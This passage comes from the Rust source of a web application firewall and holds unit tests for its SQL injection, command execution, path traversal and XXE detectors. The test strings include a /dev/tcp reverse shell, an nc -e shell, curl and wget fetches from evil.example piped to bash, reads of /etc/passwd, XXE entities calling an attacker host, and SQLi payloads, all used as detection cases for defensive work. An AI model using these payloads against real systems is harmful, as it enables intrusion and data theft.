                    walk.fire("rce_ast.cmd_subst_any");
                }
            }
            WordPiece::DoubleQuotedSequence(seq) | WordPiece::GettextDoubleQuotedSequence(seq) => {
                scan_word_pieces(seq, walk);
            }
            _ => {}
        }
    }
}

/// The **default-on** RCE + Traversal rule patterns — the single source of truth
/// the Lane 2 preprocessor gates share (codex A-3).
///
/// A synthetic view (shell-normalise / blind base64 / blind hex) is only worth
/// emitting when a *default-on* detector could actually fire on its result. Rather
/// than maintain a second, drift-prone copy of the "strong structure" list in the
/// preprocessor, both the shell-emission gate ([`super::preprocess::shell_normalize`])
/// and the blind base64/hex gate ([`super::preprocess`] `looks_structural`) build
/// their RCE/Traversal marker from exactly these patterns. Removing a rule, adding
/// one, or toggling `default_on` here therefore updates the gates in lock-step —
/// the gate can never accept a structure the default-on detector would reject, nor
/// reject one it would accept.
pub(crate) fn default_on_rce_traversal_patterns() -> impl Iterator<Item = &'static str> {
    RCE_RULES
        .iter()
        .chain(TRAVERSAL_RULES.iter())
        .filter(|(_, _, _, _, default_on)| *default_on)
        .map(|(_, _, pattern, _, _)| *pattern)
}

#[cfg(test)]
mod tests {
    use std::borrow::Cow;
    use std::collections::HashMap;
    use std::sync::Arc;

    use bytes::Bytes;
    use waf_common::{HostConfig, RequestCtx};

    use super::*;
    use crate::checks::content_security::budget::ContentInspectionState;
    use crate::checks::content_security::types::{InspectionScope, Provenance};

    fn view(text: &str) -> View<'static> {
        // Mirror the preprocessor's normalisation so tests exercise the real
        // matching surface (lowercase, whitespace-collapsed).
        let lower_trunc: String = text
            .to_ascii_lowercase()
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ");
        View {
            location: Cow::Borrowed("query"),
            round: 0,
            text: Cow::Owned(text.to_string()),
            lower_trunc,
            provenance: Provenance::Raw,
        }
    }

    fn throwaway_req() -> RequestCtx {
        RequestCtx {
            req_id: "t".to_string(),
            client_ip: "127.0.0.1".parse().expect("ip"),
            client_port: 0,
            method: "GET".to_string(),
            host: "example.com".to_string(),
            port: 80,
            path: "/".to_string(),
            query: String::new(),
            headers: HashMap::new(),
            body_preview: Bytes::new(),
            content_length: 0,
            is_tls: false,
            host_config: Arc::new(HostConfig::default()),
            geo: None,
        }
    }

    fn fire(text: &str) -> Option<DetectionFinding> {
        let det = StructuralSqlDetector::new();
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::default();
        det.detect(&view(text), &pctx, &mut st)
    }

    /// Fire against the FULL rule set (including default-off rules).
    fn fire_all(text: &str) -> Option<DetectionFinding> {
        let det = StructuralSqlDetector::with_all_rules();
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::default();
        det.detect(&view(text), &pctx, &mut st)
    }

    #[test]
    fn all_rules_compile() {
        // Every pattern in the table must compile (default-on and default-off).
        let det = StructuralSqlDetector::with_all_rules();
        assert_eq!(det.rules.len(), RULES.len(), "every rule pattern must compile");
    }

    #[test]
    fn default_on_excludes_high_noise_rules() {
        // plan v2.2: stacked / chr / hex / info_schema ship disabled by default.
        let det = StructuralSqlDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in ["sql.stacked", "sql.chr_freq", "sql.hex_const", "sql.info_schema"] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in [
            "sql.into_outfile",
            "sql.dangerous_fn",
            "sql.union_null",
            "sql.union_select",
            "sql.version_comment",
        ] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
    }

    #[test]
    fn union_select_fires() {
        let f = fire("1 union select username,password from users").expect("union select must fire");
        assert!(matches!(f.rule_key, "sql.union_null" | "sql.union_select"));
        assert_eq!(f.attack, AttackKind::SqlInjection);
    }

    #[test]
    fn union_all_select_fires() {
        // `union all select` / `union distinct select` are still SQL context.
        assert!(fire("1 union all select 1,2").is_some());
        assert!(fire("1 union distinct select 1,2").is_some());
    }

    #[test]
    fn stacked_query_fires_when_enabled() {
        // Default-off, but must fire when the full rule set is compiled.
        let f = fire_all("1; drop table users").expect("stacked query must fire with all rules");
        assert_eq!(f.rule_key, "sql.stacked");
        // …and must NOT fire on the default-on rule set.
        assert!(fire("1; drop table users").is_none(), "stacked is default-off");
    }

    #[test]
    fn into_outfile_is_strongest() {
        // outfile (95) beats a co-occurring union (≤78) → hard-veto candidate wins.
        let f = fire("1 union select 1 into outfile '/tmp/x'").expect("outfile must fire");
        assert_eq!(f.rule_key, "sql.into_outfile", "strongest rule wins");
        assert_eq!(f.confidence, 95);
    }

    #[test]
    fn dangerous_fn_fires() {
        assert_eq!(
            fire("1 and sleep(5)").expect("sleep must fire").rule_key,
            "sql.dangerous_fn"
        );
        assert_eq!(
            fire("1 and extractvalue(1,concat(0x7e,version()))")
                .expect("extractvalue must fire")
                .rule_key,
            "sql.dangerous_fn"
        );
    }

    #[test]
    fn version_comment_fires() {
        // A bare version comment (no union/select) fires exactly the version rule.
        assert_eq!(
            fire("/*!12345 x */").expect("bare version comment fires").rule_key,
            "sql.version_comment"
        );
    }

    #[test]
    fn clean_traffic_does_not_fire() {
        // Prose, JSON and ordinary queries must not trip any rule.
        assert!(fire("the quick brown fox jumps over the lazy dog").is_none());
        assert!(fire(r#"{"name":"alice","role":"admin","age":30}"#).is_none());
        assert!(fire("q=laptop&sort=price&order=asc&page=2").is_none());
        assert!(
            fire("SELECTED_ITEMS=3&reunion=family").is_none(),
            "word-boundary guards"
        );
        assert!(fire("please sleep well tonight").is_none(), "sleep without call parens");
    }

    /// codex §3.2 false-positive corpus: every one of these benign inputs must
    /// stay below the default log threshold (i.e. produce no finding) on the
    /// DEFAULT-ON rule set. This is the calibration evidence for shadow-on.
    #[test]
    fn clean_traffic_codex_negatives_do_not_fire() {
        // union/select in prose or as unrelated params — no adjacency, no fire.
        assert!(
            fire("the union will select a representative for the committee").is_none(),
            "prose 'union … select' must not fire"
        );
        assert!(
            fire("operation=union&action=select&scope=all").is_none(),
            "unrelated union/select params must not fire"
        );
        // A plain licence banner comment — no version digit → version_comment off.
        assert!(
            fire("/*! license: MIT, see LICENSE for details */").is_none(),
            "non-version /*! banner must not fire"
        );
        // Bare information_schema field name (no `.tables`) — and rule is default-off.
        assert!(
            fire("column=information_schema&sort=asc").is_none(),
            "bare information_schema must not fire"
        );
        // Even with the full rule set, a bare information_schema without the
        // structural `.tables|.columns` form stays clean.
        assert!(
            fire_all("column=information_schema&sort=asc").is_none(),
            "bare information_schema is not structural"
        );
        // Repeated char( in code / a formula — chr_freq is default-off.
        assert!(
            fire("char(65)+char(66)+char(67)+char(68)+char(69)").is_none(),
            "code char( repetition must not fire (chr_freq default-off)"
        );
        // Hex constants in a log line — hex_const is default-off.
        assert!(
            fire("addr=0xdeadbeef nonce=0xcafebabe block=0x1f").is_none(),
            "log 0x constants must not fire (hex_const default-off)"
        );
        // benchmark / sleep mentioned as words (no call parens) — no fire.
        assert!(
            fire("see the benchmark results and sleep schedule").is_none(),
            "benchmark/sleep as words (no parens) must not fire"
        );
    }

    #[test]
    fn info_schema_structural_form_fires_when_enabled() {
        // The narrowed structural `information_schema.tables|columns` form still
        // fires under the full rule set, in isolation from the union rules.
        assert_eq!(
            fire_all("select table_name from information_schema.tables")
                .expect("structural info_schema.tables fires")
                .rule_key,
            "sql.info_schema"
        );
        assert_eq!(
            fire_all("select 1 from information_schema.columns where 1=1")
                .expect("info_schema.columns fires")
                .rule_key,
            "sql.info_schema"
        );
    }

    // ── RCE detector ─────────────────────────────────────────────────────────

    fn run(det: &dyn SemanticDetector, text: &str) -> Option<DetectionFinding> {
        let req = throwaway_req();
        let pctx = PreprocessCtx {
            scope: InspectionScope::Body,
            req: &req,
        };
        let mut st = ContentInspectionState::default();
        det.detect(&view(text), &pctx, &mut st)
    }

    fn rce_fire(text: &str) -> Option<DetectionFinding> {
        run(&RceStructuralDetector::new(), text)
    }

    fn rce_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&RceStructuralDetector::with_all_rules(), text)
    }

    #[test]
    fn rce_all_rules_compile() {
        let det = RceStructuralDetector::with_all_rules();
        assert_eq!(det.rules.len(), RCE_RULES.len(), "every RCE pattern must compile");
    }

    #[test]
    fn rce_default_on_excludes_high_noise_rules() {
        let det = RceStructuralDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in ["rce.cmd_sep_common", "rce.backtick_cmd", "rce.mkfifo_revshell"] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in [
            "rce.reverse_shell",
            "rce.shell_exec_flag",
            "rce.cmd_subst",
            "rce.piped_shell",
            "rce.fetch_exec",
            "rce.sensitive_read",
        ] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
    }

    #[test]
    fn rce_reverse_shell_fires() {
        let f = rce_fire("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").expect("reverse shell fires");
        assert_eq!(f.rule_key, "rce.reverse_shell");
        assert_eq!(f.attack, AttackKind::Rce);
        assert_eq!(f.confidence, 92);
        // A FIFO reverse shell still fires via its `nc -e` component…
        assert!(rce_fire("mkfifo /tmp/f; nc -e /bin/sh 1.2.3.4 9001").is_some());
    }

    #[test]
    fn rce_bare_mkfifo_is_not_a_default_on_block() {
        // codex A-4: a bare `mkfifo` word (docs / ops tooling) must NOT reach
        // confidence 92 on the default-on set — it was removed from
        // `rce.reverse_shell`, and the joint form is default-off.
        assert!(
            rce_fire("mkfifo is a posix utility for creating named pipes").is_none(),
            "bare mkfifo doc must not fire a default-on RCE rule"
        );
        assert!(rce_fire("run mkfifo /tmp/myqueue to create the fifo").is_none());
        // A mkfifo + shell joint structure fires ONLY under the full (default-off)
        // rule set as `rce.mkfifo_revshell`; the default set stays quiet.
        let joint = "mkfifo /tmp/f then read the fifo with sh";
        assert!(rce_fire(joint).is_none(), "mkfifo_revshell is default-off");
        assert_eq!(
            rce_fire_all(joint)
                .expect("joint fifo revshell fires with all rules")
                .rule_key,
            "rce.mkfifo_revshell"
        );
    }

    #[test]
    fn rce_cmd_subst_fires_but_jquery_and_backtick_do_not() {
        assert_eq!(
            rce_fire("q=$(whoami)").expect("cmd subst fires").rule_key,
            "rce.cmd_subst"
        );
        // codex A-4: the backtick command-substitution form is now DEFAULT-OFF, so
        // a Markdown command span does not fire on the production set. (`whoami`
        // isolates the backtick rule — it is not matched by any other rule, unlike
        // `cat /etc/passwd`, which the sensitive-read rule catches independently.)
        assert!(
            rce_fire("`whoami`").is_none(),
            "backtick command subst is default-off in production"
        );
        assert!(
            rce_fire("see `curl --help` for the full option list").is_none(),
            "a Markdown command span must not fire on the default-on set"
        );
        // …but the backtick form still fires under the full rule set.
        assert_eq!(
            rce_fire_all("`whoami`")
                .expect("backtick subst fires with all rules")
                .rule_key,
            "rce.backtick_cmd"
        );
        // jQuery / templating must NOT trip cmd_subst (even with all rules).
        assert!(rce_fire_all("$(document).ready(function(){})").is_none());
        assert!(rce_fire_all("$('#main').addClass('active')").is_none());
    }

    #[test]
    fn rce_shell_exec_flag_and_piped_shell_fire() {
        assert_eq!(
            rce_fire("sh -c 'id'").expect("sh -c fires").rule_key,
            "rce.shell_exec_flag"
        );
        assert_eq!(
            rce_fire("python3 -c 'import os'").expect("python -c fires").rule_key,
            "rce.shell_exec_flag"
        );
        assert_eq!(
            rce_fire("curl http://evil/x | bash")
                .expect("pipe to shell fires")
                .rule_key,
            "rce.piped_shell"
        );
    }

    #[test]
    fn rce_fetch_exec_requires_argument_and_strong_separator() {
        assert_eq!(
            rce_fire("; wget http://evil.example/x.sh")
                .expect("fetch exec fires")
                .rule_key,
            "rce.fetch_exec"
        );
        // `&&` is a strong separator and still fires.
        assert_eq!(
            rce_fire("x && curl http://evil.example/y")
                .expect("&& curl fires")
                .rule_key,
            "rce.fetch_exec"
        );
        // codex A-4: a SINGLE `&` is the query/form field separator, NOT a shell
        // separator — `&curl help` must stay clean.
        assert!(
            rce_fire("sort=asc&curl help").is_none(),
            "a single & before curl+arg must not fire (field separator, not shell)"
        );
        assert!(
            rce_fire("a=1& curl the docs").is_none(),
            "single & + space + curl + word must not fire"
        );
        // `curl` as a value with no space+arg must NOT fire fetch_exec.
        assert!(rce_fire("method=curl&url=x").is_none(), "bare curl param must not fire");
    }

    #[test]
    fn rce_sensitive_read_fires() {
        // The shape `cat$IFS/etc/passwd` collapses to after shell normalisation.
        assert_eq!(
            rce_fire("cat /etc/passwd").expect("sensitive read fires").rule_key,
            "rce.sensitive_read"
        );
        assert_eq!(
            rce_fire("head /proc/self/environ").expect("proc read fires").rule_key,
            "rce.sensitive_read"
        );
    }

    #[test]
    fn rce_cmd_sep_common_is_default_off() {
        // Fires only under the full rule set; the default set stays quiet.
        assert_eq!(
            rce_fire_all("; ls -la")
                .expect("cmd_sep_common fires with all rules")
                .rule_key,
            "rce.cmd_sep_common"
        );
        assert!(rce_fire("; ls -la").is_none(), "cmd_sep_common is default-off");
    }

    #[test]
    fn rce_clean_traffic_does_not_fire() {
        // Bare separators / short words / prose that the FP-narrowing must reject,
        // plus a broadened holdout corpus of real docs / Markdown / JSON / CI
        // config / ops forms (codex A-4).
        for clean in [
            "a|b",
            "x&y&z",
            "cmd=sort|filter",
            "price sort order asc",
            "please ssh into the box",
            "the shell script and batch job",
            "user=nc_admin&role=member",
            "download the curl manual",
            "run benchmark and sleep",
            "a && b are both true",
            "id=42&name=alice",
            "path=/var/www/html/index.php",
            "select cat from animals where id=1",
            r#"{"cmd":"list","args":["a","b"]}"#,
            // ── broadened holdout: docs / Markdown / JSON / CI / ops ──
            "mkfifo is a posix utility for creating named pipes",
            "see the `curl --help` output for all supported flags",
            "install with: apt-get install curl wget netcat",
            "the article explains how bash and python differ",
            "step 3: run the python script to build the report",
            r#"{"tool":"curl","description":"http client","enabled":true}"#,
            r#"{"pipeline":[{"name":"build"},{"name":"deploy"}]}"#,
            r#"{"commands":["echo hello","ls -la"]}"#,
            "docs mention nc, ncat and socat as alternatives",
            "search=cat&category=pets&sort=name",
            "message=please review the perl regex in module.pm",
            "note: use `python3 -m venv` to create a virtualenv",
            "the powershell tutorial covers variables and loops",
            "filename=report_and_summary.pdf&format=pdf",
            "user typed: I love my cat and my dog",
        ] {
            assert!(rce_fire(clean).is_none(), "clean RCE negative fired: {clean:?}");
        }
    }

    // ── Traversal T1 detector ────────────────────────────────────────────────

    fn trav_fire(text: &str) -> Option<DetectionFinding> {
        run(&TraversalStructuralDetector::new(), text)
    }

    fn trav_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&TraversalStructuralDetector::with_all_rules(), text)
    }

    #[test]
    fn traversal_all_rules_compile() {
        let det = TraversalStructuralDetector::with_all_rules();
        assert_eq!(
            det.rules.len(),
            TRAVERSAL_RULES.len(),
            "every traversal pattern must compile"
        );
    }

    #[test]
    fn traversal_default_on_excludes_plain_dotdot() {
        let det = TraversalStructuralDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in ["traversal.plain_dotdot", "traversal.sensitive_abs_ops"] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in [
            "traversal.overlong",
            "traversal.encoded_dotdot",
            "traversal.sensitive_abs",
        ] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
    }

    #[test]
    fn traversal_encoded_dotdot_fires() {
        for enc in [
            "%2e%2e%2f",
            "..%2f..%2f..%2fetc",
            "%2e%2e/",
            "..%5cwindows",
            // mixed-depth: double-encoded `..` followed by a single-encoded
            // separator — a real bypass vector, intentionally kept.
            "%252e%252e%2f",
            // codex A-4 must-fix: fully double-encoded traversal — the double-
            // encoded dot-dot MUST be followed by the fully double-encoded
            // separator (`%252f`/`%255c`), not another encoded dot.
            "%252e%252e%252fetc%252fpasswd",
            "%252e%252e%255cwindows",
        ] {
            let f = trav_fire(enc).unwrap_or_else(|| panic!("encoded traversal must fire: {enc}"));
            assert_eq!(f.attack, AttackKind::Traversal);
            assert!(matches!(f.rule_key, "traversal.encoded_dotdot" | "traversal.overlong"));
        }
        // codex A-4 must-fix: a BARE `%252e%252e` (double-encoded `..` with no
        // path separator, e.g. inside a filename) must NOT fire — it is only
        // `..`. Critically, a THIRD encoded dot is NOT a separator either —
        // `%252e%252e%252e` is three double-encoded dots with no `/`/`\`
        // anywhere, and must not be mistaken for traversal (this was the bug:
        // the old pattern accepted a further `%2e`/`%252e` as if it were a
        // separator).
        assert!(
            trav_fire("file=photo%252e%252ejpg").is_none(),
            "bare double-encoded dot-dot without a separator must not fire"
        );
        assert!(trav_fire("%252e%252e").is_none(), "bare %252e%252e is not traversal");
        assert!(
            trav_fire("%252e%252e%252e").is_none(),
            "three double-encoded dots with no path separator must not fire"
        );
        assert!(
            trav_fire("%2e%2e%2e").is_none(),
            "three single-encoded dots with no path separator must not fire"
        );
        assert!(
            trav_fire("an ellipsis in text...more content, no path here").is_none(),
            "plain ellipsis / filename-adjacent dots with no encoded separator must not fire"
        );
    }

    #[test]
    fn traversal_overlong_fires() {
        assert_eq!(
            trav_fire("..%c0%af..%c0%afetc/passwd")
                .expect("overlong traversal fires")
                .rule_key,
            "traversal.overlong"
        );
    }

    #[test]
    fn traversal_sensitive_abs_fires() {
        // The decoded form a base64/hex-wrapped traversal collapses to.
        assert_eq!(
            trav_fire("/etc/passwd").expect("sensitive abs fires").rule_key,
            "traversal.sensitive_abs"
        );
        assert_eq!(
            trav_fire(r"c:\windows\system32\cmd")
                .expect("windows abs fires")
                .rule_key,
            "traversal.sensitive_abs"
        );
    }

    #[test]
    fn traversal_plain_dotdot_default_off_but_fires_with_all() {
        // Plain `../` and the `....//` double-write bypass fire only under the
        // full rule set (the default set stays quiet to avoid relative-path FP).
        assert_eq!(
            trav_fire_all("../../../etc")
                .expect("plain dotdot fires with all")
                .rule_key,
            "traversal.plain_dotdot"
        );
        assert_eq!(
            trav_fire_all("....//....//")
                .expect("double-write fires with all")
                .rule_key,
            "traversal.plain_dotdot"
        );
        assert!(trav_fire("../../../etc").is_none(), "plain dotdot is default-off");
    }

    #[test]
    fn traversal_clean_traffic_does_not_fire() {
        for clean in [
            "./config/app.json",
            "version=1.2.3",
            "file=report_v2.pdf",
            "/api/v1/users/42",
            "path=/var/www/html",
            "name=my..file",
            "q=%2elearn&sort=asc",
            "../relative/import/path",
            "photo..2024.jpg",
            r#"{"path":"a/b/c","v":"3.4.5"}"#,
            // codex A-4: high-frequency legitimate ops/container paths are now
            // default-off — a bare mention must not fire on the production set.
            "resolver reads /etc/hosts for name lookups",
            "cgroup path is /proc/self/cgroup on this host",
            "healthcheck greps /proc/version for the kernel",
            "GET /proc/1/status returns process state",
            r#"{"mounts":["/etc/hosts","/etc/resolv.conf"]}"#,
            "file=photo%252e%252ejpg&album=trip",
        ] {
            assert!(trav_fire(clean).is_none(), "clean traversal negative fired: {clean:?}");
        }
        // The ops paths DO fire under the full rule set (proof they moved to the
        // default-off `traversal.sensitive_abs_ops`, not deleted).
        assert_eq!(
            trav_fire_all("cat /proc/self/environ")
                .expect("ops path fires with all rules")
                .rule_key,
            "traversal.sensitive_abs_ops"
        );
    }

    // ── XXE structural detector (T2-A) ───────────────────────────────────────

    fn xxe_fire(text: &str) -> Option<DetectionFinding> {
        run(&XxeStructuralDetector::new(), text)
    }

    fn xxe_fire_all(text: &str) -> Option<DetectionFinding> {
        run(&XxeStructuralDetector::with_all_rules(), text)
    }

    #[test]
    fn xxe_all_rules_compile() {
        let det = XxeStructuralDetector::with_all_rules();
        assert_eq!(det.rules.len(), XXE_RULES.len(), "every XXE pattern must compile");
    }

    #[test]
    fn xxe_id_and_config_string() {
        assert_eq!(XxeStructuralDetector::new().id(), DetectorId::XxeStruct);
        assert_eq!(DetectorId::XxeStruct.as_config_str(), "xxe_struct");
        assert_eq!(DetectorId::from_config_str("xxe_struct"), Some(DetectorId::XxeStruct));
        assert_eq!(AttackKind::Xxe.as_config_key(), "xxe");
        assert_eq!(AttackKind::from_config_key("xxe"), Some(AttackKind::Xxe));
    }

    #[test]
    fn xxe_default_on_excludes_high_noise_rules() {
        let det = XxeStructuralDetector::new();
        let on: std::collections::HashSet<&str> = det.rules.iter().map(|r| r.rule_key).collect();
        for off in ["xxe.doctype_external", "xxe.param_entity_ref", "xxe.entity_expansion"] {
            assert!(!on.contains(off), "{off} must be default-off");
        }
        for onk in ["xxe.entity_external", "xxe.param_entity_def"] {
            assert!(on.contains(onk), "{onk} must be default-on");
        }
    }

    #[test]
    fn xxe_external_entity_fires() {
        // Classic file-read and OOB parameter-entity forms — the strongest,
        // default-on signal.
        for payload in [
            r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#,
            r#"<!ENTITY xxe SYSTEM "file:///etc/passwd">"#,
            r#"<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">"#,
            r#"<!ENTITY xxe PUBLIC "-//x//y" "http://attacker/x">"#,
        ] {
            let f = xxe_fire(payload).unwrap_or_else(|| panic!("external entity must fire: {payload}"));
            assert_eq!(f.attack, AttackKind::Xxe);
            assert_eq!(f.rule_key, "xxe.entity_external");
        }
    }

    #[test]
    fn xxe_internal_param_entity_definition_fires_default_on() {
        // A purely INTERNAL parameter-entity definition (no external id) is not
        // caught by `entity_external`, so it must fire the default-on
        // `param_entity_def` rule.
        let f = xxe_fire(r#"<!DOCTYPE r [<!ENTITY % pe "internal">]>"#)
            .expect("internal parameter-entity definition must fire");
        assert_eq!(f.rule_key, "xxe.param_entity_def");
    }

    #[test]
    fn xxe_billion_laughs_fires_only_with_expansion_rule() {
        // Purely-internal billion-laughs: no SYSTEM/PUBLIC, no parameter entity, so
        // the default-on rules stay silent (proving no false certainty) and only
        // the default-off `entity_expansion` COUNT rule catches it — a parse-free,
        // bounded frequency count, never an entity expansion.
        let bomb = r#"<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;">]>"#;
        assert!(
            xxe_fire(bomb).is_none(),
            "no default-on rule fires on internal-only bomb"
        );
        let f = xxe_fire_all(bomb).expect("expansion rule fires under full rule set");
        assert_eq!(f.rule_key, "xxe.entity_expansion");
    }

    #[test]
    fn xxe_external_doctype_default_off_but_fires_with_all() {
        // An external DOCTYPE with no entity declaration only fires under the full
        // rule set (the default-off `doctype_external` rule), because a legitimate
        // XHTML `<!DOCTYPE html PUBLIC …>` matches the same shape.
        let payload = r#"<!DOCTYPE root SYSTEM "http://attacker/x.dtd">"#;
        assert!(xxe_fire(payload).is_none(), "external DOCTYPE is default-off");
        let f = xxe_fire_all(payload).expect("external DOCTYPE fires under full rule set");
        assert_eq!(f.rule_key, "xxe.doctype_external");
    }

    #[test]
    fn xxe_strongest_rule_wins() {
        // A payload that trips both `entity_external` (90) and `param_entity_def`
        // (80) reports the stronger rule.
        let f =
            xxe_fire(r#"<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">"#).expect("external parameter entity fires");
        assert_eq!(f.rule_key, "xxe.entity_external", "highest-confidence rule wins");
    }

    #[test]
    fn xxe_clean_traffic_does_not_fire() {
        // Benign traffic — including the HTML5 doctype, ordinary XML with no DTD,
        // predefined entity references, and prose/JSON that merely mentions the
        // keywords — must not trip the default-on rules.
        for clean in [
            "<!DOCTYPE html>",
            "<!doctype html>",
            r"<note><to>Alice</to><body>hi &amp; bye &lt;3</body></note>",
            r#"<root><item id="1">value</item></root>"#,
            "the system entity uses a public api",
            "please contact the system administrator",
            r#"{"doctype":"invoice","entity":"acme","mode":"system"}"#,
            "width: 50%; height: 100%;",
            "discount is 20% off; hurry",
            "SELECT * FROM entity WHERE system = 'public'",
            "an entity relationship diagram for the public system",
            r"<html><head><title>doc</title></head><body>system public</body></html>",
        ] {
            assert!(xxe_fire(clean).is_none(), "clean XXE negative fired: {clean:?}");
        }
    }

    #[test]
    fn xxe_bare_param_ref_default_off_but_fires_with_all() {
        // A lone `%name;` parameter-entity reference is noisy, so it is default-off;
        // under the full rule set it fires `param_entity_ref`.
        let payload = "%xxe;";
        assert!(xxe_fire(payload).is_none(), "bare param ref is default-off");
        let f = xxe_fire_all(payload).expect("bare param ref fires under full rule set");
        assert_eq!(f.rule_key, "xxe.param_entity_ref");
    }

    // ── AST SQLi detector (P2) ────────────────────────────────────────────────

    fn ast_fire(text: &str) -> Option<DetectionFinding> {
        run(&AstSqlDetector::new(), text)
    }

    #[test]
    fn ast_union_fires_statement_level() {
        // Pitfall ②: a UNION is invisible at the expression level; the statement
        // wrapper surfaces it as a set operation.
        let f = ast_fire("1 union select null,null,null from users").expect("union must fire");
        assert_eq!(f.rule_key, "ast.union");
        assert_eq!(f.attack, AttackKind::SqlInjection);
        assert_eq!(f.confidence, 85);
        assert!(
            ast_fire("1 union all select 1,2").is_some(),
            "union all is still a set op"
        );
    }

    #[test]
    fn ast_stacked_fires_statement_level() {
        // Pitfall ②: a stacked statement is only visible once parsed at the
        // statement level (`stmts.len() > 1`).
        let f = ast_fire("1;drop table x").expect("stacked must fire");
        assert_eq!(f.rule_key, "ast.stacked");
        assert_eq!(f.confidence, 90);
        assert_eq!(
            ast_fire("1;update users set admin=1")
                .expect("stacked update must fire")
                .rule_key,
            "ast.stacked"
        );
    }

    #[test]
    fn ast_tautology_quote_breakout_fires_with_eof_consumed() {
        // Pitfall ①: `1' or '1'='1` — a numeric wrapper leaves a dangling quote
        // (parse error, no false "clean"); the single-quote breakout wrapper parses
        // it fully (consume-to-EOF via `parse_statements`) and reveals the OR +
        // constant-comparison tautology.
        let f = ast_fire("1' or '1'='1").expect("quote-breakout tautology must fire");
        assert_eq!(f.rule_key, "ast.tautology");
        assert_eq!(f.confidence, 80);
        // Numeric tautology too.
        assert_eq!(
            ast_fire("1 or 1=1").expect("numeric tautology").rule_key,
            "ast.tautology"
        );
    }

    #[test]
    fn ast_comment_obfuscated_injection_is_labelled() {
        // Pitfall ③: comments vanish in the AST — the tokenizer strips `/**/`, so
        // `1/**/or/**/1=1` still parses to the OR tautology, and because the source
        // carried a comment marker it is labelled `ast.comment_obfusc` at the char
        // layer.
        let f = ast_fire("1/**/or/**/1=1").expect("comment-obfuscated tautology must fire");
        assert_eq!(f.rule_key, "ast.comment_obfusc");
    }

    #[test]
    fn ast_dangerous_fn_fires() {
        let f = ast_fire("1 and sleep(5)").expect("time-based blind must fire");
        assert_eq!(f.rule_key, "ast.dangerous_fn");
        assert_eq!(f.confidence, 85);
        assert_eq!(
            ast_fire("1 and extractvalue(1,concat(0x7e,version()))")
                .expect("extractvalue must fire")
                .rule_key,
            "ast.dangerous_fn"
        );
    }

    #[test]
    fn ast_subquery_fires() {
        let f = ast_fire("1 = (select password from users limit 1)").expect("subquery must fire");
        assert_eq!(f.rule_key, "ast.subquery");
        assert_eq!(f.confidence, 78);
    }

    #[test]
    fn ast_clean_traffic_does_not_fire() {
        // The high-FP surface: benign scalars, prose with `or`/`and`, JSON, UUIDs,
        // versions, identifiers, and "looks-like-a-column" values must NOT fire.
        for clean in [
            "42",
            "alice",
            "laptop",
            "price",
            "true",
            "null",
            "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
            "version=1.2.3",
            "the quick brown fox jumps over the lazy dog",
            "cats and dogs and birds",
            "active or inactive",
            "true or false",
            "red and blue",
            "please select an option from the menu",
            "reunion committee",
            "q=laptop&sort=price&order=asc&page=2",
            r#"{"name":"alice","role":"admin","age":30}"#,
            "SELECT_ALL=1&reunion=family",
            "i love my cat and my dog",
            "search for shoes and socks",
            "status = active",
            "order by relevance please",
            "drops of rain and sunshine",
            "a normal sentence, nothing to see here",
            "user@example.com",
            "2026-07-23T00:00:00Z",
        ] {
            assert!(
                ast_fire(clean).is_none(),
                "clean AST negative fired: {clean:?} -> {:?}",
                ast_fire(clean)
            );
        }
    }

    #[test]
    fn ast_prefilter_skips_non_sql() {
        // The prefilter (cheap gate) must reject benign scalars so no AST budget is
        // spent, and admit the injection shapes.
        assert!(!ast_prefilter("42"));
        assert!(!ast_prefilter("alice"));
        assert!(!ast_prefilter("cats and dogs")); // `and` without a comparison
        assert!(!ast_prefilter("active or inactive"));
        assert!(ast_prefilter("1 or 1=1")); // `or` + comparison
        assert!(ast_prefilter("1 union select 1"));
        assert!(ast_prefilter("1;drop table x"));
        assert!(ast_prefilter("1' or '1'='1"));
        assert!(ast_prefilter("1/**/or/**/1=1"));
    }

    #[test]
    fn ast_deep_nesting_is_declined_without_stack_overflow() {
        // Stack-safety guard (recursive-protection OFF): pathological nesting is
        // rejected by the depth pre-scan BEFORE the parser runs, so it can never
        // overflow the stack. Each of these would abort the process if parsed.
        let parens = format!("{}1{}", "(".repeat(5000), ")".repeat(5000));
        let nots = format!("1 or {}1", "not ".repeat(5000));
        let cases = format!("{}1{}", "case when 1 then ".repeat(5000), " end".repeat(5000));
        // The P2 gap: space-separated unary `-`/`+` chains. `sqlparser` parses each
        // sign with a recursive `parse_prefix`, so a `1 or 1 < - - … 1` chain of a
        // few hundred signs overflows the worker stack — but the old depth scan
        // counted `(`/`~`/`!`/not/case only and estimated depth 0 for this input,
        // admitting it to the parser. 600 signs is well past the measured overflow
        // floor (release ~376, debug ~60), so on the pre-fix code this input aborts
        // the process (EXIT 134); the fix must decline it here instead.
        let unary_minus = format!("1 or 1 < {}1", "- ".repeat(600));
        let unary_plus = format!("1 or 1 < {}1", "+ ".repeat(600));
        let tildes = format!("1 or 1 < {}1", "~".repeat(600));
        let bangs = format!("1 or 1 < {}1", "!".repeat(600));
        // Mixed drivers must also be declined (their counts sum in the estimate).
        let mixed = format!("1 or {}1", "not - ~ case when 1 then ".repeat(200));
        for deep in [
